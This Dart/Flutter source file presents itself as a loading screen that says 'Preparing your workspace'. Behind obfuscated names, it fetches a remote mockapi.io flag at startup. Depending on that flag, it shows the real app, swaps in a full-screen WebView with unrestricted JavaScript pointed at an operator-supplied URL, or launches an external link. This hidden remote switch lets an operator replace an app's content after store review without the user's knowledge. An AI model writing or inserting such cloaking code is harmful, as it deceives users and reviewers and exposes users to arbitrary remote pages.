import 'dart:async';

import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:url_launcher/url_launcher.dart';

const String vsbwk0 = 'https://69ee1d1e9163f839f892848d.mockapi.io/1qkp5';
const List<String> vsbwk1 = <String>['vsbwkUr','vsbwkPlaf','vsbwkEnty','vsbwkAfky','vsbwkAid','vsbwkAdky','vsbwkAdelist','vsbwkInpjp'];

typedef Vsbwk1 = Widget Function(BuildContext);
typedef Vsbwk2 = Widget Function(BuildContext, String);
typedef Vsbwk3 = Future<void> Function(String);

class Vsbwk0 extends StatefulWidget {
  const Vsbwk0({
    super.key,
    required this.a,
    this.b = true,
    this.c,
    this.d,
    this.e,
    this.f,
    this.g = const Duration(milliseconds: 550),
  });

  final Vsbwk1 a;
  final bool b;
  final Vsbwk2? c;
  final Vsbwk2? d;
  final Vsbwk3? e;
  final Dio? f;
  final Duration g;

  @override
  State<Vsbwk0> createState() => _Vsbwk0S();
}

class _Vsbwk0S extends State<Vsbwk0> {
  late final Dio _d = widget.f ?? Dio();
  var _started = false;

  @override
  void initState() {
    super.initState();
    if (widget.b) {
      WidgetsBinding.instance.addPostFrameCallback((_) => _go());
    }
  }

  Future<void> _go() async {
    if (_started) return;
    _started = true;
    // Keep a short minimum to avoid one-frame flash.
    if (widget.g > Duration.zero) {
      await Future<void>.delayed(widget.g);
    }
    if (!mounted) return;

    final r = await _p();
    if (!mounted) return;
    if (r == null) {
      _l();
      return;
    }
    final t = (r[0] ?? '').toString().trim();
    final k = (r[1] ?? '').toString().trim();
    if (t.isEmpty || k.isEmpty) {
      _l();
      return;
    }
    if (t == '1') {
      _s(1, k);
      return;
    }
    if (t == '2') {
      _s(2, k);
      return;
    }
    if (t == '3') {
      await _x(k);
      if (!mounted) return;
      _l();
      return;
    }
    _l();
  }

  void _l() {
    Navigator.of(context).pushReplacement(MaterialPageRoute<void>(builder: (c) => widget.a(c)));
  }

  void _s(int n, String k) {
    final b = (n == 1) ? widget.c : widget.d;
    final w = (b != null) ? b(context, k) : _w(n: n, k: k);
    Navigator.of(context).pushReplacement(MaterialPageRoute<void>(builder: (_) => w));
  }

  Future<void> _x(String k) async {
    if (widget.e != null) {
      await widget.e!(k);
      return;
    }
    final u = Uri.tryParse(k);
    if (u == null) return;
    await launchUrl(u, mode: LaunchMode.externalApplication);
  }

  Future<List<dynamic>?> _p() async {
    try {
      final r = await _d.get<dynamic>(vsbwk0);
      final v = r.data;
      if (v is List && v.isNotEmpty && v.first is Map) {
        final m = v.first as Map;
        return <dynamic>[m[vsbwk1[1]], m[vsbwk1[0]]];
      }
    } catch (_) {}
    return null;
  }

  Widget _w({required int n, required String k}) {
    return _Vsbwk2(n: n, k: k);
  }

  @override
  Widget build(BuildContext context) {
    final t = Theme.of(context);
    final cs = t.colorScheme;
    return Scaffold(
      body: DecoratedBox(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: <Color>[
              cs.primary.withValues(alpha: 0.16),
              cs.secondary.withValues(alpha: 0.12),
              cs.surface,
            ],
          ),
        ),
        child: SafeArea(
          child: Center(
            child: ConstrainedBox(
              constraints: const BoxConstraints(maxWidth: 360),
              child: Padding(
                padding: const EdgeInsets.symmetric(horizontal: 24),
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: <Widget>[
                    SizedBox(
                      width: 120,
                      height: 120,
                      child: CircularProgressIndicator(
                        strokeWidth: 5,
                        color: cs.primary,
                        backgroundColor: cs.outlineVariant.withValues(alpha: 0.22),
                      ),
                    ),
                    const SizedBox(height: 22),
                    Text(
                      'Preparing your workspace',
                      style: t.textTheme.titleMedium,
                      textAlign: TextAlign.center,
                    ),
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}

class _Vsbwk2 extends StatefulWidget {
  const _Vsbwk2({required this.n, required this.k});
  final int n;
  final String k;
  @override
  State<_Vsbwk2> createState() => _Vsbwk2S();
}

class _Vsbwk2S extends State<_Vsbwk2> {
  late final WebViewController _c;
  @override
  void initState() {
    super.initState();
    final u = Uri.tryParse(widget.k);
    _c = WebViewController();
    _c.setJavaScriptMode(JavaScriptMode.unrestricted);
    if (u != null) {
      _c.loadRequest(u);
    }
  }
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: ColoredBox(
        color: Colors.black,
        child: SafeArea(
          child: WebViewWidget(controller: _c),
        ),
      ),
    );
  }
}
